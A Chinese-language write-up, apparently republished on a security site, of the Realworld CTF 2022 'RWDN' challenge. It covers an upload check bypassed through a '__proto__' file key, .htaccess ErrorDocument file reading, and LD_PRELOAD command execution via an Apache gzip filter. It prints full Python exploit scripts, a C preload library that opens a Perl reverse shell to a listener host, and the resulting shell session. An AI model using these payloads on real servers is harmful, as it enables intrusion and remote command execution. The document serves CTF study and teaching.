@@ -1,0 +1,830 @@
+# Realworld CTF 2022 - RWDN 复现解析
+
+阅读量 **222700**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2022-02-10 10:00:17
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p2.ssl.qhimg.com/t01b9b843fb85eb502c.jpg)
+
+## 前情提要
+
+[RWDN dockerfile](https://eson.ninja/archive/realworld2022_RWDN.zip) 这份
+dockerfile 是从 出题人 手中拿到的 和现实的题目 稍微有点有差距的地方
+
+使用 `sudo docker compose up` 等待镜像制作完成就会自动启动了
+
+题目会部署在 127.0.0.1 31337 和 31338 两个端口 和正式比赛的情况 没有区别
+
+## 拿到题目
+
+###  source 审计
+
+先查看 HTML 源码 很快就能看到注释中写的
+
+    
+    
+    <body>
+    <!-- /source -->
+    
+
+很显然是提示我们去访问 /source 目录
+
+curl 看一下 是 js 源码 这里顺手存到 source 文件里
+
+注意: 源文件无注释 我这里为了提示也是为了分析题目 所以这里部分需要注意的地方 我添加了注释
+
+    
+    
+    $ curl 127.0.0.1:31337/source | tee code.js
+    const express = require('express');
+    const fileUpload = require('express-fileupload');
+    const md5 = require('md5');
+    const { v4: uuidv4 } = require('uuid');
+    const check = require('./check'); // 这里引入了 check 不知道是什么 但是是自定义的
+    const app = express();
+    
+    const PORT = 8000;
+    
+    app.set('views', __dirname + '/views');
+    app.set('view engine', 'ejs');
+    
+    app.use(fileUpload({
+      useTempFiles : true,
+      tempFileDir : '/tmp/',
+      createParentPath : true
+    }));
+    
+    app.use('/upload',check()); // 这里调用了 check 应该是 在 ./check 的一个函数
+    
+    // 看到 这里用到了下面用到了 获取源码的方法
+    app.get('/source', function(req, res) { 
+      if (req.query.checkin){ // 让 checkin == 1 
+        res.sendfile('/src/check.js'); // 这里我们可以猜测之前 check 的意思 应该就是这个文件
+                                    // 因此接下来我们要请求拿一下 check.js 但是不急 我们接着看
+      }
+      res.sendfile('/src/server.js'); // 就是我们当前的文件
+    });
+    
+    // 我们的根目录 生成了一个 formid
+    app.get('/', function(req, res) {
+      var formid = "form-" + uuidv4();
+      res.render('index', {formid : formid} );
+    });
+    
+    // 这里是上传点  一般这里大家都会警觉
+    app.post('/upload', function(req, res) {
+      let sampleFile;
+      let uploadPath;
+      let userdir;
+      let userfile;
+      // 样本文件 获取 用的是 req.query.formid 注意可以是数字 不一定是 字符串
+      sampleFile = req.files[req.query.formid];
+      // 这里处理 文件 hash 用的 md5 分别计算了 文件 hash 和 上传者的地址
+      // node 会获取 ::ffff:{ipv4} 作为你的 ip 地址 
+      userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
+      userfile = sampleFile.name.toString(); 
+      // 文件名就是 name 字段 不是 filename 字段 正常情况是 你的 formid
+    
+      if(userfile.includes('/')||userfile.includes('..')){ 
+          return res.status(500).send("Invalid file name");
+      }
+      // 上传到的地址 注意这里是绝对地址 
+      uploadPath = '/uploads/' + userdir + '/' + userfile;
+      sampleFile.mv(uploadPath, function(err) {
+        if (err) {
+          return res.status(500).send(err);
+        }
+        // 这里提到了第二个端口 
+        // 这里也说明了 上传的文件你可以在这个地址访问到 
+        // 文件上传 getshell 基本都要用到 这个地址访问 然后让服务器执行
+        res.send('File uploaded to http://47.243.75.225:31338/' + userdir + '/' + userfile);
+      });
+    });
+    
+    app.listen(PORT, function() {
+      console.log('Express server listening on port ', PORT);
+    });
+    
+
+###  check 审计
+
+接下来 看看我们的 check.js
+
+    
+    
+    $ curl 127.0.0.1:31337/source?checkin=1 | tee check.js
+    module.exports = () => {
+        return (req, res, next) => {
+          if ( !req.query.formid || !req.files || Object.keys(req.files).length === 0) {
+            // 确认你有上传
+            res.status(400).send('Something error.');
+            return;
+          }
+            // 对每个文件的 key 进行检查 (其实这里有个例外 __proto__ 是个例外)
+          Object.keys(req.files).forEach(function(key){
+            var filename = req.files[key].name.toLowerCase(); 
+            var position = filename.lastIndexOf('.');
+            if (position == -1) {
+              return next();
+            } // 如果没有 . 就下一个文件 这里其实也有个 bypass 点位 也就是上传两个文件 用第一个 无后缀的安全文件 bypass 
+            var ext = filename.substr(position);
+            var allowexts = ['.jpg','.png','.jpeg','.html','.js','.xhtml','.txt','.realworld'];
+            if ( !allowexts.includes(ext) ){ // 确认安全文件名后缀
+              res.status(400).send('Something error.');
+              return;
+            }
+            return next(); // 所有检查完毕后 就 返回下一个文件
+          });
+        };
+      };
+    
+
+###  看一眼 31338 端口
+
+这里可以看一眼 31338 端口 然后 curl 一下
+
+    
+    
+    $ curl 127.0.0.1:31338 -v
+    *   Trying 127.0.0.1:31338...
+    * Connected to 127.0.0.1 (127.0.0.1) port 31338 (#0)
+    > GET / HTTP/1.1
+    > Host: 127.0.0.1:31338
+    > User-Agent: curl/7.81.0
+    > Accept: */*
+    > 
+    * Mark bundle as not supporting multiuse
+    < HTTP/1.1 200 OK
+    < Date: Thu, 27 Jan 2022 15:48:27 GMT
+    < Server: Apache/2.4.29 (Ubuntu)
+    < Last-Modified: Thu, 20 Jan 2022 09:18:15 GMT
+    < ETag: "31-5d5fffb6aa3c0"
+    < Accept-Ranges: bytes
+    < Content-Length: 49
+    < Content-Type: text/html
+    < 
+    * Connection #0 to host 127.0.0.1 left intact
+    Welcome to my CDN! Execute /readflag to get flag.
+    
+
+这里就是个 普通 apache 而上面的两个 则是 Express
+
+## 思路和利用
+
+既然上传这里 有问题 那么就试试上传 看看能不能弄到点什么
+
+很显然 getshell 的任何 php pl 脚本代码都是不能成功利用的 就是个 简简单单的 纯纯的 Apache 服务器
+
+###  第一部分
+
+既然是 apache 目标, 自然
+[.htaccess](https://httpd.apache.org/docs/2.4/howto/htaccess.html) apache.conf
+这种配置文件 很显然就变成了我们的目标
+
+> 你或许以为直接 cgi script 进行一把梭就完事了 很显然 这里服务器 默认是没有开启的 (因为他是 docker 而且几乎是默认的 apache
+> )
+
+既然是 Apache 那么翻翻 apache 文档
+
+####  ErrorDocument
+
+知识点 1
+[ErrorDocument](https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errordocument) 错误文档 可以看到 context 运行上下文的中存在 .htaccess
+
+可以这样利用
+
+    
+    
+    ErrorDocument 404 %{file:/etc/apache2/apache2.conf}
+    
+
+保存为 .htaccess 然后传上去
+
+无用的知识点 [ErrorLog](https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errorlog) 也能执行命令 但是很显然 上下文环境阻止了你 这里其实可以拿来出题 哈哈哈
+
+同样
+
+  * [customlog](https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_log_config.html#customlog)
+  * [globallog](https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#globallog)
+  * [forensiclog](https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_forensic.html#forensiclog)
+  * [transferlog](https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#transferlog)
+
+都具有 pipe 形式
+
+滥用 htaccess 以及其中一些模块的方法 <https://github.com/wireghoul/htshells>
+
+> 额外找到了一些 相关的利用方法
+>
+> SetEnv LD_PERLOAD
+>
+> <https://www.freebuf.com/articles/web/192052.html>
+>
+> <https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>
+
+####  上传文件
+
+这里直接贴代码
+
+    
+    
+    import requests
+    import hashlib
+    
+    target_ip = "127.0.0.1"
+    target_render_port = 31338
+    target_upload_port = 31337
+    
+    upload_file = ".htaccess"
+    normal_file = "a.txt"
+    
+    request_sender_ip = "172.18.0.1" 
+    request_ip = "::ffff:{}".format(request_sender_ip)
+    
+    # 这里是为了好看 跟踪一下请求
+    def print_request(response):
+        print("request form")
+        print("=========================================================")
+        print(response.request.method, response.request.url)
+        for header_key in response.request.headers.keys():
+            print("{}: {}".format(header_key, response.request.headers[header_key]))
+        body = response.request.body
+        if body == None:
+            print("")
+        else:
+            print( body.decode())
+        print("=========================================================")
+    
+    def print_response(response):
+        print("response form")
+        print("=========================================================")
+        print(response.status_code, response.url)
+        for header_key in response.headers.keys():
+            print("{}: {}".format(header_key, response.headers[header_key]))
+        print("")
+        print(response.text)
+        print("=========================================================")
+    
+    def md5(string):
+        return hashlib.md5(string.encode()).hexdigest()
+    
+    # 计算上传点
+    def calc_upload_path(upload_file, form_id ): # form_id 是无用的 无所谓传什么
+        """
+        # 对应的 js 代码
+        userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
+        userfile = sampleFile.name.toString();
+        if(userfile.includes('/')||userfile.includes('..')){
+          return res.status(500).send("Invalid file name");
+        }
+        uploadPath = '/uploads/' + userdir + '/' + userfile;
+        """
+        file_md5 = hashlib.md5(open(upload_file,'rb').read()).hexdigest()
+        userdir  = md5(md5(request_ip)+file_md5)
+        userfile = form_id # 这里其实无用 
+        # upload_path = '/uploads/' + userdir + '/' + userfile # the realworld ctf Env
+        upload_path = '/' + userdir + '/'
+        return upload_path
+    
+    def main():
+    
+        ## STEP 1 get formid if you need
+        uplaod_url1 = "http://{}:{}/".format(target_ip, target_upload_port)
+        r = requests.get(uplaod_url1)
+        form_id = r.text.split("action='")[1].split("'")[0]
+        real_form_id = form_id.split('/upload?formid=')[1]
+        print("you should use this id: ",real_form_id)
+    
+        ## STEP 2 upload error file
+        # 方法 1 多文件上传绕过
+        """
+        # real_form_id = upload_file
+        upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,real_form_id)
+        upload_file_id = real_form_id
+        files = {
+                real_form_id : open(normal_file,'r'),
+                real_form_id : open(upload_file,'r'),
+        } 
+        # need uplaod 2 same name file as bad request 
+        # 可以这么发包 塞入两个文件 但是很显然 这里前一个文件会被后一个文件盖掉 
+        # 倒是强行可以通过 自己定义写多部分 来进行上传 但是代码复用度不好
+        # 所以你会发现 你最后只上传了一个文件
+        """
+        # 方法 2 proto 大魔法
+        upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,"1")
+        files = {
+            "__proto__": open(upload_file,"r"), 
+            "decoy":("decoy","random"),
+        }
+        """
+        原理参照一个小哥 在 discord 中发的内容: 如下
+        the __proto__ file is not checked because Object.keys does not include properties from the prototype, 
+        but since the prototype is now an array we can use formid=1 to access that file again in the upload function
+        """
+        r2 = requests.post(upload_url2,files=files)
+        print_request(r2)
+        print_response(r2)
+    
+        ## STEP 3 get the response
+        access_path = "http://{}:{}".format(target_ip,target_render_port) + \
+                calc_upload_path(upload_file,real_form_id) + "NonExistFile" 
+        # 强行 在这个目录下 404
+        r3 = requests.get(access_path)
+        print_request(r3)
+        print_response(r3)
+        ## 如果这里你的 .htaccess 文件 成功上传了 就会在这里 拿到 你 .htaccess 文件 ErrorDocument 指向的文件
+    
+    
+    if __name__ == '__main__':
+        main()
+    
+
+###  第二部分
+
+####  apache2.conf审计
+
+> 文件很长 可以直接拉到最后 看
+    
+    
+    # This is the main Apache server configuration file.  It contains the
+    # configuration directives that give the server its instructions.
+    # See http://httpd.apache.org/docs/2.4/ for detailed information about
+    # the directives and /usr/share/doc/apache2/README.Debian about Debian specific
+    # hints.
+    #
+    #
+    # Summary of how the Apache 2 configuration works in Debian:
+    # The Apache 2 web server configuration in Debian is quite different to
+    # upstream's suggested way to configure the web server. This is because Debian's
+    # default Apache2 installation attempts to make adding and removing modules,
+    # virtual hosts, and extra configuration directives as flexible as possible, in
+    # order to make automating the changes and administering the server as easy as
+    # possible.
+    
+    # It is split into several files forming the configuration hierarchy outlined
+    # below, all located in the /etc/apache2/ directory:
+    #
+    #       /etc/apache2/
+    #       |-- apache2.conf
+    #       |       `--  ports.conf
+    #       |-- mods-enabled
+    #       |       |-- *.load
+    #       |       `-- *.conf
+    #       |-- conf-enabled
+    #       |       `-- *.conf
+    #       `-- sites-enabled
+    #               `-- *.conf
+    #
+    #
+    # * apache2.conf is the main configuration file (this file). It puts the pieces
+    #   together by including all remaining configuration files when starting up the
+    #   web server.
+    #
+    # * ports.conf is always included from the main configuration file. It is
+    #   supposed to determine listening ports for incoming connections which can be
+    #   customized anytime.
+    #
+    # * Configuration files in the mods-enabled/, conf-enabled/ and sites-enabled/
+    #   directories contain particular configuration snippets which manage modules,
+    #   global configuration fragments, or virtual host configurations,
+    #   respectively.
+    #
+    #   They are activated by symlinking available configuration files from their
+    #   respective *-available/ counterparts. These should be managed by using our
+    #   helpers a2enmod/a2dismod, a2ensite/a2dissite and a2enconf/a2disconf. See
+    #   their respective man pages for detailed information.
+    #
+    # * The binary is called apache2. Due to the use of environment variables, in
+    #   the default configuration, apache2 needs to be started/stopped with
+    #   /etc/init.d/apache2 or apache2ctl. Calling /usr/bin/apache2 directly will not
+    #   work with the default configuration.
+    
+    
+    # Global configuration
+    #
+    
+    #
+    # ServerRoot: The top of the directory tree under which the server's
+    # configuration, error, and log files are kept.
+    #
+    # NOTE!  If you intend to place this on an NFS (or otherwise network)
+    # mounted filesystem then please read the Mutex documentation (available
+    # at <URL:http://httpd.apache.org/docs/2.4/mod/core.html#mutex>);
+    # you will save yourself a lot of trouble.
+    #
+    # Do NOT add a slash at the end of the directory path.
+    #
+    #ServerRoot "/etc/apache2"
+    
+    #
+    # The accept serialization lock file MUST BE STORED ON A LOCAL DISK.
+    #
+    #Mutex file:${APACHE_LOCK_DIR} default
+    
+    #
+    # The directory where shm and other runtime files will be stored.
+    #
+    
+    DefaultRuntimeDir ${APACHE_RUN_DIR}
+    
+    #
+    # PidFile: The file in which the server should record its process
+    # identification number when it starts.
+    # This needs to be set in /etc/apache2/envvars
+    #
+    PidFile ${APACHE_PID_FILE}
+    
+    #
+    # Timeout: The number of seconds before receives and sends time out.
+    #
+    Timeout 300
+    
+    #
+    # KeepAlive: Whether or not to allow persistent connections (more than
+    # one request per connection). Set to "Off" to deactivate.
+    #
+    KeepAlive On
+    
+    #
+    # MaxKeepAliveRequests: The maximum number of requests to allow
+    # during a persistent connection. Set to 0 to allow an unlimited amount.
+    # We recommend you leave this number high, for maximum performance.
+    #
+    MaxKeepAliveRequests 100
+    
+    #
+    # KeepAliveTimeout: Number of seconds to wait for the next request from the
+    # same client on the same connection.
+    #
+    KeepAliveTimeout 5
+    
+    
+    # These need to be set in /etc/apache2/envvars
+    User ${APACHE_RUN_USER}
+    Group ${APACHE_RUN_GROUP}
+    
+    #
+    # HostnameLookups: Log the names of clients or just their IP addresses
+    # e.g., www.apache.org (on) or 204.62.129.132 (off).
+    # The default is off because it'd be overall better for the net if people
+    # had to knowingly turn this feature on, since enabling it means that
+    # each client request will result in AT LEAST one lookup request to the
+    # nameserver.
+    #
+    HostnameLookups Off
+    
+    # ErrorLog: The location of the error log file.
+    # If you do not specify an ErrorLog directive within a <VirtualHost>
+    # container, error messages relating to that virtual host will be
+    # logged here.  If you *do* define an error logfile for a <VirtualHost>
+    # container, that host's errors will be logged there and not here.
+    #
+    ErrorLog ${APACHE_LOG_DIR}/error.log  
+    # 这种地方是改写不了变量的 或许需要一些我没发现的魔法
+    
+    #
+    # LogLevel: Control the severity of messages logged to the error_log.
+    # Available values: trace8, ..., trace1, debug, info, notice, warn,
+    # error, crit, alert, emerg.
+    # It is also possible to configure the log level for particular modules, e.g.
+    # "LogLevel info ssl:warn"
+    #
+    LogLevel warn
+    
+    # Include module configuration:
+    IncludeOptional mods-enabled/*.load
+    IncludeOptional mods-enabled/*.conf
+    
+    # Include list of ports to listen on
+    Include ports.conf
+    
+    
+    # Sets the default security model of the Apache2 HTTPD server. It does
+    # not allow access to the root filesystem outside of /usr/share and /var/www.
+    # The former is used by web applications packaged in Debian,
+    # the latter may be used for local directories served by the web server. If
+    # your system is serving content from a sub-directory in /srv you must allow
+    # access here, or in any related virtual host.
+    <Directory />
+            Options FollowSymLinks
+            AllowOverride ALL
+            Require all denied
+    </Directory>
+    
+    <Directory /usr/share>
+            AllowOverride ALL
+            Require all granted
+    </Directory>
+    
+    <Directory /var/www/>
+            Options Indexes FollowSymLinks
+            AllowOverride ALL
+            Require all granted
+    </Directory>
+    
+    #<Directory /srv/>
+    #       Options Indexes FollowSymLinks
+    #       AllowOverride None
+    #       Require all granted
+    #</Directory>
+    
+    
+    
+    
+    # AccessFileName: The name of the file to look for in each directory
+    # for additional configuration directives.  See also the AllowOverride
+    # directive.
+    #
+    AccessFileName .htaccess
+    
+    #
+    # The following lines prevent .htaccess and .htpasswd files from being
+    # viewed by Web clients.
+    #
+    <FilesMatch "^\.ht">
+            Require all denied
+    </FilesMatch>
+    
+    
+    #
+    # The following directives define some format nicknames for use with
+    # a CustomLog directive.
+    #
+    # These deviate from the Common Log Format definitions in that they use %O
+    # (the actual bytes sent including headers) instead of %b (the size of the
+    # requested file), because the latter makes it impossible to detect partial
+    # requests.
+    #
+    # Note that the use of %{X-Forwarded-For}i instead of %h is not recommended.
+    # Use mod_remoteip instead.
+    #
+    LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" combined
+    LogFormat "%h %l %u %t \"%r\" %>s %O" common
+    LogFormat "%{Referer}i -> %U" referer
+    LogFormat "%{User-agent}i" agent
+    
+    # Include of directories ignores editors' and dpkg's backup files,
+    # see README.Debian for details.
+    ExtFilterDefine gzip mode=output cmd=/bin/gzip 
+    # 这个比较有东西哦 可以看到有命令执行了那么套用类似 PHP Mail bypass disable func 的思路进行利用
+    
+    # Include generic snippets of statements
+    IncludeOptional conf-enabled/*.conf
+    
+    # Include the virtual host configurations:
+    IncludeOptional sites-enabled/*.conf
+    
+    # vim: syntax=apache ts=4 sw=4 sts=4 sr noet
+    
+
+###  htaccess 滥用 挂载 LD_PERLOAD
+
+    
+    
+    // save as perload.c
+    // 编译 gcc perload.c  -fPIC -shared -o 1.so 
+    #define _GNU_SOURCE
+    
+    #include <stdlib.h>
+    #include <stdio.h>
+    #include <string.h>
+    
+    
+    extern char** environ;
+    
+    __attribute__ ((__constructor__)) void preload (void) // 构建 预执行属性
+    {
+    
+        const char* cmdline = "perl -e 'use Socket;$i=\"172.18.0.1\";$p=8884;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'";
+    
+        // const char* cmdline = "perl /tmp/r3.pl > /tmp/r3pwn"
+    
+        int i;
+        for (i = 0; environ[i]; ++i) {
+                if (strstr(environ[i], "LD_PRELOAD")) {
+                        environ[i][0] = '\0';
+                }
+        }
+        system(cmdline);
+    }
+    
+
+接下来上 python 利用
+
+    
+    
+    import requests
+    import hashlib
+    
+    
+    target_ip = "127.0.0.1"
+    target_upload_port = 31337
+    upload_file = ".htaccess"
+    target_render_port = 31338
+    request_sender_ip = "172.18.0.1"
+    request_ip = "::ffff:{}".format(request_sender_ip)
+    
+    # 还是 为了好看
+    def print_request(response):
+        print("request form")
+        print("=========================================================")
+        print(response.request.method, response.request.url)
+        for header_key in response.request.headers.keys():
+            print("{}: {}".format(header_key, response.request.headers[header_key]))
+        body = response.request.body
+        if body == None:
+            print("")
+        else:
+            print( body )
+        print("=========================================================")
+    
+    def print_response(response):
+        print("response form")
+        print("=========================================================")
+        print(response.status_code, response.url)
+        for header_key in response.headers.keys():
+            print("{}: {}".format(header_key, response.headers[header_key]))
+        print("")
+        print(response.text)
+        print("=========================================================")
+    
+    def md5(string):
+        return hashlib.md5(string.encode()).hexdigest()
+    
+    # 计算上传路径
+    def calc_upload_path(upload_file, form_id ):
+        """
+        userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
+        userfile = sampleFile.name.toString();
+        if(userfile.includes('/')||userfile.includes('..')){
+          return res.status(500).send("Invalid file name");
+        }
+        uploadPath = '/uploads/' + userdir + '/' + userfile;
+        """
+        file_md5 = hashlib.md5(open(upload_file,'rb').read()).hexdigest()
+        userdir  = md5(md5(request_ip)+file_md5)
+        userfile = form_id
+        # upload_path = '/uploads/' + userdir + '/' + userfile # the realworld ctf Env
+        upload_path = '/' + userdir + '/'
+    
+        return upload_path
+    
+    
+    
+    def main():
+        ## STEP 4 upload error
+        # 上传 1.so
+        sofile_path = uplaod_file("1.so")
+    
+        code = """SetEnv LD_PRELOAD "/var/www/html{}1.so"
+    SetOutputFilter gzip
+    ErrorDocument 403 /etc/apache2/apache2.conf
+    """.format(sofile_path)
+        # 启用 gzip 过滤器 执行命令
+        # 生成 htaccess
+        htaccess_file_gen(code)
+        # 输出 这里为了 debug
+        print("sofile_path: ",sofile_path)
+        # 上传 htaccess
+        htaccess_path = uplaod_file(".htaccess")
+        print("htaccess_path: ",htaccess_path)
+    
+        print("getshell exec with curl http://{}:{}".format(target_ip,target_render_port)+htaccess_path)
+    
+    # 生成代码
+    def htaccess_file_gen(code):
+        with open(".htaccess","w") as f:
+            f.write(code)
+        print("gen successfully")
+    
+    # 上传文件 利用方法是上面 提到的
+    def uplaod_file(filename):
+        uplaod_url1 = "http://{}:{}/".format(target_ip, target_upload_port)
+        r = requests.get(uplaod_url1)
+        form_id = r.text.split("action='")[1].split("'")[0]
+        real_form_id = form_id.split('/upload?formid=')[1]
+        print("you should use this id: ",real_form_id)
+    
+        upload_url2 = "http://{}:{}/upload?formid={}".format(target_ip,target_upload_port,"1")
+        files = {
+            "__proto__": open(filename,"rb"),
+            "decoy":("decoy","random"),
+        }
+        r2 = requests.post(upload_url2,files=files)
+        print_request(r2)
+        print_response(r2)
+    
+        form_id = real_form_id
+        return calc_upload_path(filename,form_id)
+    
+    
+    if __name__ == '__main__':
+        main()
+    
+
+最后运行结果的 拿到 .htaccess 文件对应的地址 一个 curl 打过去就有了
+
+当然记得起 netcat 的监听
+
+## 最后 Getshell readflag
+
+直接执行一个 readflag 的计算
+
+    
+    
+    └─$ nc -lvvp 8884        
+    listening on [any] 8884 ...
+    172.18.0.3: inverse host lookup failed: Unknown host
+    connect to [172.18.0.1] from (UNKNOWN) [172.18.0.3] 54924
+    bash: cannot set terminal process group (31): Inappropriate ioctl for device
+    bash: no job control in this shell
+    www-data@a17ac98d17ba:/$ ls -al
+    ls -al
+    total 100
+    drwxr-xr-x   1 root root  4096 Jan 27 07:28 .
+    drwxr-xr-x   1 root root  4096 Jan 27 07:28 ..
+    -rwxr-xr-x   1 root root     0 Jan 27 07:28 .dockerenv
+    drwxr-xr-x   2 root root  4096 Jan  5 19:29 bin
+    drwxr-xr-x   2 root root  4096 Apr 24  2018 boot
+    drwxr-xr-x   5 root root   340 Jan 27 07:28 dev
+    drwxr-xr-x   1 root root  4096 Jan 27 07:28 etc
+    -r-x------   1 root root    39 Jan 20 09:19 flag
+    drwxr-xr-x   2 root root  4096 Apr 24  2018 home
+    drwxr-xr-x   1 root root  4096 May 23  2017 lib
+    drwxr-xr-x   2 root root  4096 Jan  5 19:29 lib64
+    drwxr-xr-x   2 root root  4096 Jan  5 19:27 media
+    drwxr-xr-x   2 root root  4096 Jan  5 19:27 mnt
+    drwxr-xr-x   2 root root  4096 Jan  5 19:27 opt
+    dr-xr-xr-x 334 root root     0 Jan 27 07:28 proc
+    -r-sr-xr-x   1 root root 13144 Jan 20 09:16 readflag
+    drwx------   1 root root  4096 Jan 27 07:44 root
+    drwxr-xr-x   1 root root  4096 Jan 27 07:28 run
+    drwxr-xr-x   2 root root  4096 Jan  5 19:29 sbin
+    drwxr-xr-x   2 root root  4096 Jan  5 19:27 srv
+    dr-xr-xr-x  13 root root     0 Jan 27 07:28 sys
+    drwxrwxrwt   1 root root  4096 Jan 27 07:28 tmp
+    drwxr-xr-x   1 root root  4096 Jan  5 19:27 usr
+    drwxr-xr-x   1 root root  4096 Jan 27 07:28 var
+    www-data@a17ac98d17ba:/$ readflag
+    readflag
+    bash: readflag: command not found
+    www-data@a17ac98d17ba:/$ ./readflag
+    ./readflag
+    Solve the easy challenge first
+    (((((-854089)-(772258))+(5324))+(474988))-(-472881))
+    input your answer: -673154
+    ok! here is your flag!!
+    rwctf{cd81450983c06bcb4438dfb8de45ec04}
+    www-data@a17ac98d17ba:/$
+    
+
+## Wrap up
+
+总体思路与知识点
+
+  1. 代码审计
+  2. proto 利用 | 发现双文件上传 bypass
+  3. 利用 htaccess 越界读 获取 一些敏感配置文件
+  4. 利用 htaccess 和 一些错误配置 RCE
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **M-A-D** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/267233](/post/id/267233)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+  * [RealWorld](/tag/RealWorld)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/g?b=oidb&k=A2lCRetibwocHQvT8Ujzfiag&s=40&t=1614870066)
+M-A-D
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
